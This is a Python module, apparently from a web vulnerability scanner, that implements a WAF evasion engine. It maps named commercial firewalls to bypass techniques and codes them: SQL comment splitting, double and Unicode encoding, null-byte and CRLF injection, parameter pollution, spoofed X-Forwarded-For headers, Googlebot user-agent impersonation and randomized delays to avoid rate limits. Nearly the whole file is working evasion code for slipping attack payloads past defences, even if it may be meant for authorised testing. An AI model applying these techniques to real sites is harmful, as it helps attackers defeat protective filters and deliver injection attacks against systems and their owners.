"""
WAF Evasion Engine — Adaptive evasion strategies when a WAF is detected.

Provides encoding, header manipulation, chunking, and timing-based
evasion techniques that integrate with PayloadEngine and BaseTester.
"""
import random
import urllib.parse
import logging

logger = logging.getLogger(__name__)


class WAFEvasionEngine:
    """Adaptive WAF evasion — selects techniques based on detected WAF product."""

    # Technique registry: each technique is a callable transforming (payload) → payload
    TECHNIQUES = [
        'random_case',
        'double_url_encode',
        'unicode_substitute',
        'comment_insertion',
        'whitespace_variation',
        'chunk_payload',
        'null_byte_prefix',
        'header_smuggle',
        'parameter_pollution',
    ]

    # Per-WAF recommended technique sets
    WAF_TECHNIQUE_MAP = {
        'cloudflare': ['double_url_encode', 'unicode_substitute', 'comment_insertion', 'chunk_payload'],
        'modsecurity': ['comment_insertion', 'whitespace_variation', 'random_case', 'null_byte_prefix'],
        'akamai': ['double_url_encode', 'unicode_substitute', 'random_case', 'chunk_payload'],
        'imperva': ['comment_insertion', 'unicode_substitute', 'whitespace_variation'],
        'aws_waf': ['double_url_encode', 'comment_insertion', 'random_case'],
        'f5': ['unicode_substitute', 'whitespace_variation', 'comment_insertion'],
        'wordfence': ['double_url_encode', 'random_case', 'null_byte_prefix'],
        'sucuri': ['comment_insertion', 'random_case', 'whitespace_variation'],
    }

    def __init__(self, waf_products: list = None):
        self.waf_products = [p.lower() for p in (waf_products or [])]
        self._techniques = self._select_techniques()

    def _select_techniques(self) -> list:
        """Pick evasion techniques based on detected WAF products."""
        if not self.waf_products:
            # Generic evasion — try everything
            return self.TECHNIQUES[:]

        techniques = set()
        for product in self.waf_products:
            for waf_key, techs in self.WAF_TECHNIQUE_MAP.items():
                if waf_key in product:
                    techniques.update(techs)
                    break
            else:
                # Unknown WAF — use generic set
                techniques.update(self.TECHNIQUES[:5])

        return list(techniques)

    def evade(self, payload: str, max_variants: int = 3) -> list:
        """Generate evasion variants of a payload.

        Returns a list of transformed payloads (including the original).
        """
        variants = [payload]
        seen = {payload}

        for technique_name in self._techniques:
            if len(variants) >= max_variants + 1:
                break
            method = getattr(self, f'_t_{technique_name}', None)
            if not method:
                continue
            variant = method(payload)
            if variant and variant not in seen:
                variants.append(variant)
                seen.add(variant)

        return variants

    def get_evasion_headers(self) -> dict:
        """Return HTTP headers that may help bypass WAF inspection."""
        headers = {}
        # Random IP in X-Forwarded-For to confuse IP-based rules
        fake_ip = f'{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}'
        headers['X-Forwarded-For'] = fake_ip
        headers['X-Originating-IP'] = fake_ip
        headers['X-Remote-IP'] = fake_ip
        headers['X-Remote-Addr'] = fake_ip

        # Content-Type variations that may bypass body inspection
        content_types = [
            'application/x-www-form-urlencoded',
            'multipart/form-data; boundary=----WebKitFormBoundary',
            'text/plain',
            'application/json',
        ]
        headers['Content-Type'] = random.choice(content_types)

        # User-Agent rotation
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
        ]
        headers['User-Agent'] = random.choice(user_agents)

        return headers

    def get_timing_delay(self) -> float:
        """Return a randomised delay (seconds) to avoid rate-limiting patterns."""
        return random.uniform(0.5, 2.5)

    # ── Evasion Technique Implementations ────────────────────────────────────

    @staticmethod
    def _t_random_case(payload: str) -> str:
        """Randomly toggle case of alphabetic characters."""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            if c.isalpha() else c
            for c in payload
        )

    @staticmethod
    def _t_double_url_encode(payload: str) -> str:
        """Double URL-encode special characters."""
        first = urllib.parse.quote(payload, safe='')
        return urllib.parse.quote(first, safe='')

    @staticmethod
    def _t_unicode_substitute(payload: str) -> str:
        """Replace ASCII chars with Unicode fullwidth equivalents."""
        result = []
        for c in payload:
            if 'a' <= c <= 'z':
                result.append(chr(ord(c) - ord('a') + 0xFF41))
            elif 'A' <= c <= 'Z':
                result.append(chr(ord(c) - ord('A') + 0xFF21))
            else:
                result.append(c)
        return ''.join(result)

    @staticmethod
    def _t_comment_insertion(payload: str) -> str:
        """Insert SQL/HTML comments to break signature matching."""
        # Works for SQL: UN/**/ION SEL/**/ECT
        words = payload.split()
        if len(words) < 2:
            return payload
        result = []
        for word in words:
            if len(word) > 3 and random.random() > 0.4:
                mid = len(word) // 2
                result.append(f'{word[:mid]}/**/{word[mid:]}')
            else:
                result.append(word)
        return ' '.join(result)

    @staticmethod
    def _t_whitespace_variation(payload: str) -> str:
        """Replace spaces with alternative whitespace characters."""
        alternatives = ['\t', '\n', '\r', '\x0b', '\x0c', '+', '%09', '%0a']
        ws = random.choice(alternatives)
        return payload.replace(' ', ws)

    @staticmethod
    def _t_chunk_payload(payload: str) -> str:
        """Split payload into chunks using string concatenation (SQL context)."""
        if len(payload) < 6:
            return payload
        mid = len(payload) // 2
        return f"'{payload[:mid]}'||'{payload[mid:]}'"

    @staticmethod
    def _t_null_byte_prefix(payload: str) -> str:
        """Prepend null byte — may bypass length/content checks."""
        return f'%00{payload}'

    @staticmethod
    def _t_header_smuggle(payload: str) -> str:
        """Add CRLF sequences that may confuse header parsers."""
        return f'{payload}%0d%0a'

    @staticmethod
    def _t_parameter_pollution(payload: str) -> str:
        """Generate HTTP Parameter Pollution variant."""
        return f'test=safe&test={payload}'
